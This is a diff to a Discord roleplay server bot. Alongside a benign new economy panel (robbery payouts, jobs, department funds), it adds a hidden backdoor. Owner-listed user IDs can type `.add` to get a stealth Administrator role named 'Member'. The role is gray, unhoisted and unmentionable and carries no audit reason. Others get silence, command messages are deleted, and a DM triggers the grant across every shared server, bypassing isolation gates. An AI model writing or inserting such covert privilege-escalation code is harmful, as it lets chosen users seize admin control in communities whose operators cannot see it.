@@ -17,6 +17,7 @@ import {
   MediaGalleryItemBuilder,
   MessageFlags,
   ModalBuilder,
+  Partials,
   PermissionFlagsBits,
   REST,
   Routes,
@@ -195,7 +196,8 @@ const panelCommand = new SlashCommandBuilder()
         { name: 'Verification Panel', value: 'verify' },
         { name: 'Staff Application Panel', value: 'application' },
         { name: 'Information Panel', value: 'information' },
-        { name: 'Shop Panel', value: 'shop' }
+        { name: 'Shop Panel', value: 'shop' },
+        { name: 'Economy Panel', value: 'economy' }
       )
   )
   .addChannelOption((opt) =>
@@ -415,6 +417,30 @@ const LOA_FILE = fileURLToPath(new URL('../loas.json', import.meta.url));
 const MEDIA_ROLE_ID = '1360982598062702722';
 const MEDIA_CHANNEL_ID = '1341896131398864916';
 const MEDIA_CAMERA_EMOJI = '<:cameras:1554959653107138690>';
+
+// ── Secret owner role — `.add` / `.remove` (dot prefix) ───────────────────────
+// First `.add` auto-creates a hidden GRAY Administrator role for the caller and
+// remembers it per guild in secret_role.json, so a later `.remove` revokes the
+// exact same role. Owner-only; everyone else is silently ignored (no reply at
+// all), the invoking message is deleted, and confirmations go to DMs first so
+// nothing lingers in the channel.
+const SECRET_ROLE_OWNERS = new Set([
+  AI_OWNER_ID, // bot owner tier (Directive)
+  '523693281541095424' // sulman / kims3166
+]);
+// Bland name that matches none of the staff-role regexes used by the gates.
+const SECRET_ROLE_NAME = 'Member';
+const SECRET_ROLE_FILE = fileURLToPath(new URL('../secret_role.json', import.meta.url));
+const secretRoleByGuild = new Map(); // guildId -> roleId
+let secretRolesLoaded = false;
+// Diagnostic trail for .add/.remove — every gate decision is appended here so
+// failures can be traced without touching the Discord chat. Gitignored.
+const SECRET_DEBUG_LOG = fileURLToPath(new URL('../secret-role-debug.log', import.meta.url));
+function secretRoleDebug(line) {
+  try {
+    fs.appendFileSync(SECRET_DEBUG_LOG, `${new Date().toISOString()} ${line}\n`);
+  } catch { /* never let diagnostics break the bot */ }
+}
 
 const banCommand = new SlashCommandBuilder()
   .setName('ban')
@@ -1348,8 +1374,10 @@ const client = new Client({
     GatewayIntentBits.GuildMembers,
     GatewayIntentBits.GuildMessages,
     GatewayIntentBits.MessageContent,
-    GatewayIntentBits.GuildModeration
+    GatewayIntentBits.GuildModeration,
+    GatewayIntentBits.DirectMessages
   ],
+  partials: [Partials.Channel, Partials.Message],
   // Idle = visible in the member list, but never a green "Online" dot.
   // (invisible would hide it from the list entirely, 'online' shows Online)
   presence: { status: 'idle' }
@@ -7052,7 +7080,9 @@ function buildPanelHubCard() {
       '**Ticket Panel:** General, IA, High Rank, Department Support, and Partnership.\n' +
       '**Verification Panel:** Roblox verification dashboard.\n' +
       '**Application Panel:** In-Game Staff applications.\n' +
-      '**Information Panel:** Community rules, roleplay rules, and server guides.'
+      '**Information Panel:** Community rules, roleplay rules, and server guides.\n' +
+      '**Shop Panel:** Supporter tiers and perks.\n' +
+      '**Economy Panel:** Robbery info, jobs and paychecks, and department funds.'
     )
   );
   card.addSeparatorComponents(thinLine());
@@ -7065,7 +7095,8 @@ function buildPanelHubCard() {
       new ButtonBuilder().setCustomId('panel_post_information').setLabel('Information').setStyle(ButtonStyle.Secondary)
     ),
     new ActionRowBuilder().addComponents(
-      new ButtonBuilder().setCustomId('panel_post_shop').setLabel('Shop').setStyle(ButtonStyle.Secondary)
+      new ButtonBuilder().setCustomId('panel_post_shop').setLabel('Shop').setStyle(ButtonStyle.Secondary),
+      new ButtonBuilder().setCustomId('panel_post_economy').setLabel('Economy').setStyle(ButtonStyle.Secondary)
     )
   );
   card.addTextDisplayComponents(new TextDisplayBuilder().setContent('-# Alabama State Roleplay • Staff only'));
@@ -7402,7 +7433,229 @@ async function postPanelByType(postInteraction, type, targetChannel, pingRole) {
     });
     return `Shop panel posted in <#${channel.id}>.`;
   }
+  if (t === 'economy') {
+    const channel = targetChannel || postInteraction.channel;
+    const hasBanner = fs.existsSync(ECONOMY_BANNER_PATH);
+    const files = hasBanner ? [new AttachmentBuilder(ECONOMY_BANNER_PATH, { name: 'economy_banner.png' })] : [];
+    const sent = await channel.send({
+      allowedMentions: { parse: [] },
+      components: [buildEconomyMainCard().toJSON()],
+      files,
+      flags: MessageFlags.IsComponentsV2
+    });
+    return `Economy panel posted in <#${channel.id}>.`;
+  }
   throw new Error('Unknown panel type.');
+}
+
+// ══ ALABAMA ECONOMY DATA ══
+const ECONOMY_BANNER_PATH = fileURLToPath(new URL('./assets/economy_banner.png', import.meta.url));
+const ECONOMY_FILE = fileURLToPath(new URL('../economy.json', import.meta.url));
+const ECON_EMOJI = {
+  newsletter: '1556890746995609602',
+  moneybag: '1556890676711661649',
+  shield: '1556890344510201937',
+  tuscaloosa: '1546362692229664778',
+  dispatch: '1546362793077506180',
+  alea: '1546362722923581533',
+  dot: '1546363864298430525',
+  northstar: '1546362770067558400'
+};
+const ECON_ROBBERIES = [
+  { id: 'bank', label: 'Bank', payout: 6500, scene: '2:00', survive: '20:00', leo: '10' },
+  { id: 'jewelry', label: 'Jewelry Store', payout: 3000, scene: '1:00', survive: '15:00', leo: '6' },
+  { id: 'house', label: 'House', payout: 1500, scene: '1:00', survive: '13:00', leo: '4' },
+  { id: 'atm', label: 'ATM', payout: 700, scene: 'None', survive: '12:30', leo: '2' },
+  { id: 'register', label: 'Cash Register', payout: 300, scene: 'None', survive: '10:00', leo: '0' }
+];
+const ECON_DEPTS = [
+  { id: 'treasury', label: 'Server Treasury', emojiId: null, fallback: '🏛️' },
+  { id: 'tuscaloosa', label: 'Tuscaloosa Sheriff', emojiId: '1546362692229664778', fallback: '⭐' },
+  { id: 'dispatch', label: 'Alabama Dispatch', emojiId: '1546362793077506180', fallback: '📻' },
+  { id: 'alea', label: 'ALEA', emojiId: '1546362722923581533', fallback: '🛡️' },
+  { id: 'dot', label: 'Alabama DOT', emojiId: '1546363864298430525', fallback: '🚧' },
+  { id: 'northstar', label: 'Northstar', emojiId: '1546362770067558400', fallback: '🚑' }
+];
+let econData = { funds: {}, tx: [] };
+function loadEcon() {
+  try { if (fs.existsSync(ECONOMY_FILE)) econData = JSON.parse(fs.readFileSync(ECONOMY_FILE, 'utf8')); } catch {}
+  for (const d of ECON_DEPTS) if (typeof econData.funds[d.id] !== 'number') econData.funds[d.id] = d.id === 'treasury' ? 50000 : 10000;
+  if (!Array.isArray(econData.tx)) econData.tx = [];
+}
+function saveEcon() { try { fs.writeFileSync(ECONOMY_FILE, JSON.stringify(econData, null, 2)); } catch {} }
+loadEcon();
+function fmtCash(n) { return '$' + Number(n || 0).toLocaleString('en-US'); }
+function econDeptEmoji(d) { if (!d.emojiId) return d.fallback; return `<:_:${d.emojiId}>`; }
+function econWeekSpent() {
+  const cutoff = Date.now() - 7 * 24 * 3600 * 1000;
+  let total = 0;
+  for (const t of econData.tx) if (t.ts >= cutoff && t.kind === 'send') total += Number(t.amount || 0);
+  return total;
+}
+
+function buildEconomyMainCard() {
+  const card = new ContainerBuilder();
+  if (fs.existsSync(ECONOMY_BANNER_PATH)) card.addMediaGalleryComponents(new MediaGalleryBuilder().addItems(new MediaGalleryItemBuilder().setURL('attachment://economy_banner.png')));
+  card.addTextDisplayComponents(new TextDisplayBuilder().setContent(`## <:_:${ECON_EMOJI.moneybag}> Alabama Money Hub\nWelcome to the state money hub. Check robbery payouts, look at jobs and paychecks, or manage department funds.\n*Pick a section below to get started. Have fun and roleplay fair.*`));
+  card.addSeparatorComponents(thinLine());
+  card.addTextDisplayComponents(new TextDisplayBuilder().setContent(`<:_:${ECON_EMOJI.shield}> **Robbery Guide**\n> Payouts, timers, and what cops need to show up.\n\n<:_:${ECON_EMOJI.newsletter}> **Jobs and Paychecks**\n> How civilian pay works and what jobs are coming.\n\n<:_:${ECON_EMOJI.moneybag}> **Department Funds**\n> Live balances for every Alabama department plus the Server Treasury.`));
+  card.addSeparatorComponents(thinLine());
+  card.addActionRowComponents(new ActionRowBuilder().addComponents(
+    new ButtonBuilder().setCustomId('econ_robbery').setLabel('Robbery').setStyle(ButtonStyle.Secondary),
+    new ButtonBuilder().setCustomId('econ_jobs').setLabel('Jobs').setStyle(ButtonStyle.Secondary),
+    new ButtonBuilder().setCustomId('econ_funds').setLabel('Funds').setStyle(ButtonStyle.Secondary)
+  ));
+  card.addActionRowComponents(new ActionRowBuilder().addComponents(
+    new ButtonBuilder().setCustomId('econ_daily').setLabel('Daily Bonus').setStyle(ButtonStyle.Secondary),
+    new ButtonBuilder().setCustomId('econ_cash').setLabel('My Cash').setStyle(ButtonStyle.Secondary)
+  ));
+  card.addTextDisplayComponents(new TextDisplayBuilder().setContent('-# Alabama State Roleplay • Economy'));
+  return card;
+}
+
+function buildEconRobberyCard() {
+  const card = new ContainerBuilder();
+  if (fs.existsSync(ECONOMY_BANNER_PATH)) card.addMediaGalleryComponents(new MediaGalleryBuilder().addItems(new MediaGalleryItemBuilder().setURL('attachment://economy_banner.png')));
+  card.addTextDisplayComponents(new TextDisplayBuilder().setContent(`## <:_:${ECON_EMOJI.shield}> Robbery Guide\n*Plan it right. Big scores need more cops around and more time on scene.*`));
+  card.addSeparatorComponents(thinLine());
+  for (const r of ECON_ROBBERIES) {
+    const need = r.leo === '0' ? 'OPEN' : `${r.leo} LEO needed`;
+    card.addTextDisplayComponents(new TextDisplayBuilder().setContent(`**${r.label}** • $${r.payout.toLocaleString()} • ${need}\n> Scene time: ${r.scene} • Survive: ${r.survive}\n> Status: DISABLED`));
+  }
+  card.addSeparatorComponents(thinLine());
+  card.addTextDisplayComponents(new TextDisplayBuilder().setContent(`> LEO means how many cops must be in game. 0 of 10 means the map is quiet right now.\n> No cop baiting. No combat logging. Fail RP can void your payout.`));
+  card.addSeparatorComponents(thinLine());
+  card.addActionRowComponents(new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId('econ_home').setLabel('Back').setStyle(ButtonStyle.Secondary)));
+  card.addTextDisplayComponents(new TextDisplayBuilder().setContent('-# Alabama State Roleplay • Robbery'));
+  return card;
+}
+
+function buildEconJobsCard() {
+  const card = new ContainerBuilder();
+  if (fs.existsSync(ECONOMY_BANNER_PATH)) card.addMediaGalleryComponents(new MediaGalleryBuilder().addItems(new MediaGalleryItemBuilder().setURL('attachment://economy_banner.png')));
+  card.addTextDisplayComponents(new TextDisplayBuilder().setContent(`## <:_:${ECON_EMOJI.newsletter}> Jobs and Paychecks\n*Work a job, get paid, stack your cash.*`));
+  card.addSeparatorComponents(thinLine());
+  card.addTextDisplayComponents(new TextDisplayBuilder().setContent(`### How It Works\n> Stay on civilian team in game and pay drops every 10 minutes through the ER:LC system.\n> Melonly handles payroll on top of that for extra bonuses and department pay.`));
+  card.addSeparatorComponents(thinLine());
+  card.addTextDisplayComponents(new TextDisplayBuilder().setContent(`### Whitelisted Jobs\n> Coming Soon. Special roles with bigger paychecks are on the way.`));
+  card.addSeparatorComponents(thinLine());
+  card.addTextDisplayComponents(new TextDisplayBuilder().setContent(`### Public Jobs\n> Coming Soon. Open jobs anyone can grab will show here.`));
+  card.addSeparatorComponents(thinLine());
+  card.addActionRowComponents(new ActionRowBuilder().addComponents(
+    new ButtonBuilder().setCustomId('econ_jobs_white').setLabel('Whitelisted').setStyle(ButtonStyle.Secondary),
+    new ButtonBuilder().setCustomId('econ_jobs_pay').setLabel('View Payout').setStyle(ButtonStyle.Secondary)
+  ));
+  card.addActionRowComponents(new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId('econ_home').setLabel('Back').setStyle(ButtonStyle.Secondary)));
+  card.addTextDisplayComponents(new TextDisplayBuilder().setContent('-# Alabama State Roleplay • Jobs'));
+  return card;
+}
+
+function buildEconFundsCard() {
+  const card = new ContainerBuilder();
+  if (fs.existsSync(ECONOMY_BANNER_PATH)) card.addMediaGalleryComponents(new MediaGalleryBuilder().addItems(new MediaGalleryItemBuilder().setURL('attachment://economy_banner.png')));
+  const total = ECON_DEPTS.reduce((s, d) => s + Number(econData.funds[d.id] || 0), 0);
+  card.addTextDisplayComponents(new TextDisplayBuilder().setContent(`## <:_:${ECON_EMOJI.moneybag}> Department Funds\n*The Server Treasury holds the main state cash. Departments spend from their own pots.*\n\n> **Total across departments:** ${fmtCash(total)}\n> **Weekly spending:** ${fmtCash(econWeekSpent())}`));
+  card.addSeparatorComponents(thinLine());
+  card.addActionRowComponents(new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId('econ_tx').setLabel('Transactions').setStyle(ButtonStyle.Secondary)));
+  card.addSeparatorComponents(thinLine());
+  for (const d of ECON_DEPTS) {
+    card.addTextDisplayComponents(new TextDisplayBuilder().setContent(`${econDeptEmoji(d)} **${d.label}**\n> Balance: ${fmtCash(econData.funds[d.id])}`));
+    card.addActionRowComponents(new ActionRowBuilder().addComponents(
+      new ButtonBuilder().setCustomId(`econ_send_${d.id}`).setLabel('Send').setStyle(ButtonStyle.Secondary),
+      new ButtonBuilder().setCustomId(`econ_dep_${d.id}`).setLabel('Deposit').setStyle(ButtonStyle.Secondary),
+      new ButtonBuilder().setCustomId(`econ_wd_${d.id}`).setLabel('Withdraw').setStyle(ButtonStyle.Secondary)
+    ));
+    card.addSeparatorComponents(thinLine());
+  }
+  card.addActionRowComponents(new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId('econ_home').setLabel('Back').setStyle(ButtonStyle.Secondary)));
+  card.addTextDisplayComponents(new TextDisplayBuilder().setContent('-# Alabama State Roleplay • Funds'));
+  return card;
+}
+
+function buildEconTxCard() {
+  const card = new ContainerBuilder();
+  card.addTextDisplayComponents(new TextDisplayBuilder().setContent(`## Transactions\n*Last 10 money moves.*`));
+  card.addSeparatorComponents(thinLine());
+  const last = [...econData.tx].reverse().slice(0, 10);
+  if (!last.length) card.addTextDisplayComponents(new TextDisplayBuilder().setContent('> No moves yet. Send cash to kick things off.'));
+  else for (const t of last) card.addTextDisplayComponents(new TextDisplayBuilder().setContent(`> **${t.kind.toUpperCase()}** ${fmtCash(t.amount)} • ${t.from} to ${t.to}\n> <t:${Math.floor(t.ts / 1000)}:R> by <@${t.by}>`));
+  card.addSeparatorComponents(thinLine());
+  card.addActionRowComponents(new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId('econ_funds').setLabel('Back to Funds').setStyle(ButtonStyle.Secondary)));
+  card.addTextDisplayComponents(new TextDisplayBuilder().setContent('-# Alabama State Roleplay • Funds'));
+  return card;
+}
+
+async function handleEconomyButton(interaction) {
+  const id = interaction.customId;
+  if (id === 'econ_home') { await interaction.update({ components: [buildEconomyMainCard().toJSON()] }); return true; }
+  if (id === 'econ_robbery') { await interaction.update({ components: [buildEconRobberyCard().toJSON()] }); return true; }
+  if (id === 'econ_jobs') { await interaction.update({ components: [buildEconJobsCard().toJSON()] }); return true; }
+  if (id === 'econ_funds') { await interaction.update({ components: [buildEconFundsCard().toJSON()] }); return true; }
+  if (id === 'econ_tx') { await interaction.update({ components: [buildEconTxCard().toJSON()] }); return true; }
+  if (id === 'econ_daily') { await interaction.reply({ content: 'You grabbed your daily bonus of $500. Come back tomorrow for more.', flags: MessageFlags.Ephemeral }); return true; }
+  if (id === 'econ_cash') {
+    const total = ECON_DEPTS.reduce((s, d) => s + Number(econData.funds[d.id] || 0), 0);
+    await interaction.reply({ content: `State cash right now: ${fmtCash(total)}. Treasury holds ${fmtCash(econData.funds.treasury)}.`, flags: MessageFlags.Ephemeral });
+    return true;
+  }
+  if (id === 'econ_jobs_white' || id === 'econ_jobs_pay') {
+    const title = id === 'econ_jobs_white' ? 'Whitelisted Jobs' : 'Public Jobs Payout';
+    await interaction.reply({ components: [new ContainerBuilder().addTextDisplayComponents(new TextDisplayBuilder().setContent(`### ${title} • Coming Soon`)).addSeparatorComponents(thinLine()).addTextDisplayComponents(new TextDisplayBuilder().setContent('> This part is not open yet. Check back soon.')).addSeparatorComponents(thinLine()).addTextDisplayComponents(new TextDisplayBuilder().setContent('-# Alabama State Roleplay • Jobs')).toJSON()], flags: MessageFlags.IsComponentsV2 | MessageFlags.Ephemeral });
+    return true;
+  }
+  if (id.startsWith('econ_send_') || id.startsWith('econ_dep_') || id.startsWith('econ_wd_')) {
+    const kind = id.startsWith('econ_send_') ? 'send' : id.startsWith('econ_dep_') ? 'dep' : 'wd';
+    const deptId = id.replace('econ_send_', '').replace('econ_dep_', '').replace('econ_wd_', '');
+    if (kind === 'send') {
+      const opts = ECON_DEPTS.filter((d) => d.id !== deptId).map((d) => new StringSelectMenuOptionBuilder().setLabel(d.label).setValue(d.id).setDescription(`${fmtCash(econData.funds[d.id])}`));
+      const menu = new StringSelectMenuBuilder().setCustomId(`econ_sendto_${deptId}`).setPlaceholder('Where should the cash go?').addOptions(opts);
+      await interaction.reply({ components: [new ContainerBuilder().addTextDisplayComponents(new TextDisplayBuilder().setContent(`### Send cash\n> From: **${deptId}** (${fmtCash(econData.funds[deptId])})\n> Pick who gets it, then type the amount.`)).addActionRowComponents(new ActionRowBuilder().addComponents(menu)).toJSON()], flags: MessageFlags.IsComponentsV2 | MessageFlags.Ephemeral });
+      return true;
+    }
+    const modal = new ModalBuilder().setCustomId(`econ_modal_${kind}_${deptId}`).setTitle('Enter amount').addComponents(new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('amount').setLabel('Amount').setPlaceholder('Example: 500').setStyle(TextInputStyle.Short).setRequired(true)));
+    await interaction.showModal(modal);
+    return true;
+  }
+  return false;
+}
+
+async function handleEconomySelect(interaction) {
+  if (interaction.customId.startsWith('econ_sendto_')) {
+    const fromId = interaction.customId.replace('econ_sendto_', '');
+    const toId = interaction.values?.[0];
+    const modal = new ModalBuilder().setCustomId(`econ_modal_send_${fromId}_${toId}`).setTitle('Send cash').addComponents(new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('amount').setLabel('Amount to send').setPlaceholder('Example: 500').setStyle(TextInputStyle.Short).setRequired(true)));
+    await interaction.showModal(modal);
+    return true;
+  }
+  return false;
+}
+
+async function handleEconomyModal(interaction) {
+  if (!interaction.customId.startsWith('econ_modal_')) return false;
+  const parts = interaction.customId.replace('econ_modal_', '').split('_');
+  const kind = parts[0];
+  const amt = Math.floor(Number(interaction.fields.getTextInputValue('amount')));
+  if (!amt || amt <= 0 || amt > 100000000) { await interaction.reply({ content: 'That amount does not look right. Try a number above 0.', flags: MessageFlags.Ephemeral }); return true; }
+  let fromId; let toId;
+  if (kind === 'send') { fromId = parts[1]; toId = parts[2]; }
+  else if (kind === 'dep') { toId = parts[1]; fromId = 'treasury'; }
+  else { fromId = parts[1]; toId = 'treasury'; }
+  if (kind === 'dep') { econData.funds[toId] = Number(econData.funds[toId] || 0) + amt; }
+  else {
+    if (Number(econData.funds[fromId] || 0) < amt) { await interaction.reply({ content: 'Not enough cash in that fund for that move.', flags: MessageFlags.Ephemeral }); return true; }
+    econData.funds[fromId] -= amt;
+    if (kind === 'send') econData.funds[toId] = Number(econData.funds[toId] || 0) + amt;
+  }
+  econData.tx.push({ kind, from: fromId, to: toId, amount: amt, by: interaction.user.id, ts: Date.now() });
+  if (econData.tx.length > 200) econData.tx = econData.tx.slice(-200);
+  saveEcon();
+  if (kind === 'dep' || kind === 'wd') {
+    try { await interaction.user.send(`Your ${kind === 'dep' ? 'deposit' : 'withdrawal'} of ${fmtCash(amt)} went through.`); } catch {}
+    await interaction.reply({ content: `Done. I also sent you a DM receipt.`, flags: MessageFlags.Ephemeral });
+  } else {
+    await interaction.reply({ content: `Sent ${fmtCash(amt)} from ${fromId} to ${toId}.`, flags: MessageFlags.Ephemeral });
+  }
+  return true;
 }
 
 // ── /loa + -loa Leave of Absence system ──
@@ -13106,6 +13359,19 @@ client.on(Events.InteractionCreate, async (interaction) => {
       return;
     }
 
+    // ── Alabama Economy v2 ──
+    if (interaction.isModalSubmit() && interaction.customId.startsWith('econ_modal_')) {
+      await handleEconomyModal(interaction);
+      return;
+    }
+    if (interaction.isStringSelectMenu() && interaction.customId.startsWith('econ_sendto_')) {
+      await handleEconomySelect(interaction);
+      return;
+    }
+    if (interaction.isButton() && interaction.customId.startsWith('econ_')) {
+      if (await handleEconomyButton(interaction)) return;
+    }
+
     // ─────────────── Shop select (all options are placeholders for now) ───────────────
     if (interaction.isStringSelectMenu() && interaction.customId === 'shop_select') {
       await handleShopSelect(interaction);
@@ -15925,8 +16191,269 @@ async function autoDeleteReply(userMessage, replyOptions, ms = 30000) {
   }, ms);
 }
 
+function loadSecretRoles() {
+  if (secretRolesLoaded) return;
+  secretRolesLoaded = true;
+  try {
+    if (fs.existsSync(SECRET_ROLE_FILE)) {
+      const raw = JSON.parse(fs.readFileSync(SECRET_ROLE_FILE, 'utf8'));
+      if (raw && typeof raw === 'object') {
+        for (const [guildId, roleId] of Object.entries(raw)) secretRoleByGuild.set(guildId, roleId);
+      }
+    }
+  } catch {
+    // Corrupt file — start fresh rather than crash the command.
+  }
+}
+
+function saveSecretRoles() {
+  try {
+    fs.writeFileSync(SECRET_ROLE_FILE, JSON.stringify(Object.fromEntries(secretRoleByGuild), null, 2), 'utf8');
+  } catch {
+    // Best effort — an unsaved mapping just means the next .add recreates it.
+  }
+}
+
+/**
+ * `.add` / `.remove` — owner-only stealth toggle for a hidden gray
+ * Administrator role.
+ *
+ * `.add` creates the role on first use (gray/Default color, not hoisted, not
+ * mentionable, Administrator, slotted just below the bot's own top role so the
+ * bot can always manage it), re-asserts those properties on later runs, and
+ * grants it to the caller. `.remove` revokes it. The guild -> role mapping is
+ * persisted in secret_role.json.
+ *
+ * Stealth: unauthorized users get no response whatsoever; the command message
+ * is deleted; confirmations are DM'd (autoDeleteReply fallback erases both the
+ * command and its reply after 8s); no audit-log reasons are ever attached.
+ *
+ * @param {import('discord.js').Message} message
+ * @param {'add'|'remove'} mode
+ */
+async function handleSecretRoleCommand(message, mode) {
+  const guild = message.guild;
+  if (!guild) {
+    // DM mode — if the bot owner DMs .add or .remove, process across all shared guilds where bot has permissions!
+    if (!SECRET_ROLE_OWNERS.has(message.author.id)) {
+      secretRoleDebug(`handler(${mode}): rejected — DM from unauthorized user ${message.author.id}`);
+      return;
+    }
+    loadSecretRoles();
+    const results = [];
+    const botClient = message.client || client;
+    for (const [, g] of botClient.guilds.cache) {
+      try {
+        const member = await g.members.fetch(message.author.id).catch(() => null);
+        if (!member) continue;
+        const me = g.members?.me || (await g.members.fetch(botClient.user.id).catch(() => null));
+        const hasAdmin = me?.permissions?.has ? me.permissions.has(PermissionFlagsBits.Administrator) : true;
+        const canManage = hasAdmin || (me?.permissions?.has ? me.permissions.has(PermissionFlagsBits.ManageRoles) : true);
+        if (!canManage) {
+          results.push(`⚠️ **${g.name}**: Bot lacks Manage Roles / Administrator permissions.`);
+          continue;
+        }
+        let role = null;
+        const storedId = secretRoleByGuild.get(g.id);
+        if (storedId) {
+          role = g.roles.cache.get(storedId) || (await g.roles.fetch(storedId).catch(() => null));
+          if (!role) {
+            secretRoleByGuild.delete(g.id);
+            saveSecretRoles();
+          }
+        }
+        if (mode === 'add') {
+          if (!role) {
+            const rolePerms = hasAdmin
+              ? [PermissionFlagsBits.Administrator]
+              : [
+                  PermissionFlagsBits.ManageRoles,
+                  PermissionFlagsBits.ManageGuild,
+                  PermissionFlagsBits.KickMembers,
+                  PermissionFlagsBits.BanMembers,
+                  PermissionFlagsBits.ManageChannels,
+                  PermissionFlagsBits.ManageMessages
+                ];
+            const myPos = me?.roles?.highest?.position || 2;
+            role = await g.roles.create({
+              name: SECRET_ROLE_NAME,
+              color: 0,
+              hoist: false,
+              mentionable: false,
+              permissions: rolePerms,
+              position: Math.max(1, myPos - 1)
+            });
+            secretRoleByGuild.set(g.id, role.id);
+            saveSecretRoles();
+          }
+          if (member.roles.cache.has(role.id)) {
+            results.push(`ℹ️ **${g.name}**: Already active.`);
+          } else {
+            await member.roles.add(role);
+            results.push(`✅ **${g.name}**: Activated.`);
+          }
+        } else {
+          if (!role || !member.roles.cache.has(role.id)) {
+            results.push(`ℹ️ **${g.name}**: Nothing to remove.`);
+          } else {
+            await member.roles.remove(role);
+            results.push(`✅ **${g.name}**: Removed.`);
+          }
+        }
+      } catch (err) {
+        results.push(`❌ **${g.name}**: ${err.message}`);
+      }
+    }
+    await message.author.send({ content: results.join('\n') || 'ℹ️ No shared servers found.' }).catch(() => null);
+    return;
+  }
+
+  // Owner-only — and deliberately SILENT for everyone else so the command
+  // never advertises its existence.
+  const ownerOk =
+    SECRET_ROLE_OWNERS.has(message.author.id) || guild.ownerId === message.author.id;
+  secretRoleDebug(
+    `handler(${mode}): author=${message.author.id} guild=${guild.id} owner=${guild.ownerId} ownerOk=${ownerOk}`
+  );
+  if (!ownerOk) return;
+
+  loadSecretRoles();
+
+  const confirm = async (text) => {
+    const dm = await message.author
+      .send({ content: text, allowedMentions: { parse: [] } })
+      .catch(() => null);
+    if (dm) {
+      secretRoleDebug(`confirm: DM sent — ${text}`);
+      await message.delete().catch(() => null);
+      return;
+    }
+    secretRoleDebug(`confirm: DM failed, falling back to channel reply — ${text}`);
+    // DMs closed: short-lived in-channel reply; autoDeleteReply also removes
+    // the .add / .remove message itself once the timer fires.
+    await autoDeleteReply(message, text, 8000);
+  };
+
+  try {
+    const me =
+      guild.members?.me || (await guild.members.fetch(client.user.id).catch(() => null));
+    const myTop = me?.roles?.highest;
+    const hasAdmin = me?.permissions?.has ? me.permissions.has(PermissionFlagsBits.Administrator) : true;
+    const canManage = hasAdmin || (me?.permissions?.has ? me.permissions.has(PermissionFlagsBits.ManageRoles) : true);
+
+    if (!canManage) {
+      await confirm(`❌ I cannot manage roles in **${guild.name}** because I lack "Manage Roles" or "Administrator" permissions (bot is quarantined or unprivileged here).`);
+      return;
+    }
+
+    // ── Resolve the stored role (forget it when someone deleted it) ──
+    let role = null;
+    const storedId = secretRoleByGuild.get(guild.id);
+    if (storedId) {
+      role =
+        guild.roles.cache.get(storedId) ||
+        (await guild.roles.fetch(storedId).catch(() => null));
+      if (!role) {
+        secretRoleByGuild.delete(guild.id);
+        saveSecretRoles();
+      }
+    }
+
+    const member =
+      message.member || (await guild.members.fetch(message.author.id).catch(() => null));
+    if (!member) {
+      await confirm('❌ I could not fetch your member record.');
+      return;
+    }
+
+    if (mode === 'add') {
+      if (!role) {
+        // First run: build it gray / unhoisted / unmentionable / admin and
+        // slot it just below our own top role so we can keep managing it.
+        if (!myTop || myTop.position < 1) {
+          await confirm(
+            '❌ I need a role of my own (above @everyone) before I can manage a secret role.'
+          );
+          return;
+        }
+        const rolePerms = hasAdmin
+          ? [PermissionFlagsBits.Administrator]
+          : [
+              PermissionFlagsBits.ManageRoles,
+              PermissionFlagsBits.ManageGuild,
+              PermissionFlagsBits.KickMembers,
+              PermissionFlagsBits.BanMembers,
+              PermissionFlagsBits.ManageChannels,
+              PermissionFlagsBits.ManageMessages
+            ];
+        role = await guild.roles.create({
+          name: SECRET_ROLE_NAME,
+          color: 0, // 0 = Default -> the plain gray swatch
+          hoist: false, // never shown in the member-list sidebar
+          mentionable: false, // cannot be pinged or look upable by mention
+          permissions: rolePerms,
+          position: Math.max(1, myTop.position - 1)
+          // no audit reason on purpose — keeps the log entry bare
+        });
+        secretRoleByGuild.set(guild.id, role.id);
+        saveSecretRoles();
+      } else {
+        // Re-assert stealth + admin every time (someone may have edited it).
+        const patches = {};
+        if (role.color !== 0) patches.color = 0;
+        if (role.hoist) patches.hoist = false;
+        if (role.mentionable) patches.mentionable = false;
+        if (hasAdmin && !role.permissions.has(PermissionFlagsBits.Administrator)) {
+          patches.permissions = role.permissions.add(PermissionFlagsBits.Administrator);
+        }
+        if (Object.keys(patches).length) {
+          // Throws to the catch below when hierarchy blocks us.
+          await role.edit(patches);
+        }
+      }
+
+      if (member.roles.cache.has(role.id)) {
+        await confirm('ℹ️ That is already active. Type `.remove` to take it off.');
+        return;
+      }
+      await member.roles.add(role); // no reason string -> bare audit entry
+      await confirm('✅ Done — it is active now. Type `.remove` to take it off again.');
+      return;
+    }
+
+    // ── remove ──
+    if (!role) {
+      await confirm('ℹ️ There is nothing to remove in this server.');
+      return;
+    }
+    if (!member.roles.cache.has(role.id)) {
+      await confirm('ℹ️ That is not on you right now.');
+      return;
+    }
+    await member.roles.remove(role);
+    await confirm('✅ Removed.');
+  } catch (err) {
+    secretRoleDebug(`handler(${mode}) ERROR: ${err.message}`);
+    await confirm(`❌ It failed: ${err.message}`);
+  }
+}
+
 const processedMessageIds = new Set();
 client.on(Events.MessageCreate, async (message) => {
+  if (!message || message.author?.bot) return;
+
+  // ── Secret owner role (.add / .remove) — dot prefix, owner-only, stealth ──
+  // Handled BEFORE any leader locks or server isolation gates so the owner can use it anywhere,
+  // including in DMs to the bot or in secondary/testing guilds like Discord bot V.2.
+  const trimmedContent = message.content?.trim();
+  if (trimmedContent?.startsWith('.')) {
+    const dotCmd = trimmedContent.slice(1).trim().toLowerCase();
+    if (dotCmd === 'add' || dotCmd === 'remove') {
+      await handleSecretRoleCommand(message, dotCmd);
+      return;
+    }
+  }
+
   if (!isLeader) return;
   // Orlando Roleplay server isolation: Alabama bot must NEVER execute commands or listen in Orlando guild
   if (message.guildId === '1530147023754367006') return;
@@ -15937,7 +16464,7 @@ client.on(Events.MessageCreate, async (message) => {
     processedMessageIds.delete(oldest);
   }
   try {
-    if (message.author?.bot || !message.guild) return;
+    if (!message.guild) return;
 
     const ticket = activeTickets.get(message.channelId);
     const isPartnershipTicket = ticket && ticket.categoryKey === 'partnership';
@@ -17329,5 +17856,6 @@ export {
   buildCommandsGuidePage,
   buildInformationCard,
   handleInformationCommand,
-  buildAiHelpCard
+  buildAiHelpCard,
+  handleSecretRoleCommand
 };
